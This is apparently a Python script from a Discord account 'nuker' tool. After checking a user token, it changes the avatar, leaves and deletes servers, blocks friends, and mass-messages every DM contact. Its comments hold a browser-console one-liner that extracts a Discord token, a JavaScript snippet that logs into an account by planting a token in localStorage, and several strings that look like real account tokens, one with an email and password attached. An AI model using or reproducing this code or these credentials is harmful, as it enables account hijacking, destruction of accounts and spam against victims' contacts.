from AresCore import BlockFriends, LeaveGuilds, CreateGuilds, DeleteGuilds, SetWorstSettings, CloseDMs, MassMessageDM, UserAvatar
from AresCore import CheckToken, IsGuild, GetAllGuilds
from Utils import clear
from rich import print as rprint
import global_vars, os

config = global_vars.config
token = config['account']['token']

def user_check() -> bool:
	clear()

	rprint('[purple] > Checking Token User [white]')
	if CheckToken(token, 'user'):
		rprint('[chartreuse3] > Token user is vaild [white]')
		return True
	else:
		rprint('[red3] > Token user is invaild [white]')
		input()
		return False


def AccountNuke() -> None:
	UserAvatar()
	LeaveGuilds()
	DeleteGuilds()
	BlockFriends()
	MassMessageDM()
	CloseDMs()
	# CreateGuilds()
	# SetWorstSettings()

# (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
"""
let token = "";function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 2500);}
login(token);
ODQzMjYyNzYyNDQ4ODQ2ODYw.GCrH5b.3d23ny1fcExearkzKkvwCX57zHuluP_dkcQTnQ
MTAxNTgyMDY5NzIxMTI0MDQ2OA.Gsc65J.Sy7PFKeBJ-Zl9pYYa4sIf4YPKWY19EmhQVtNYI
MTEyMzkyOTI2MDYxNzM3MTY5OA.Gv85dH.vvdGf7osCh9i08YQ4fnHYHC_a2oVGX9zwop4lg
MTEyMzk0MTU1NjE0ODI0ODYwNg.GkFbr0.roiQE3nsnPurFTUtsXA50GS82l0M4WFr4TLWZQ:65cb8039447@inactivemachine.com:alt_acc:123
"""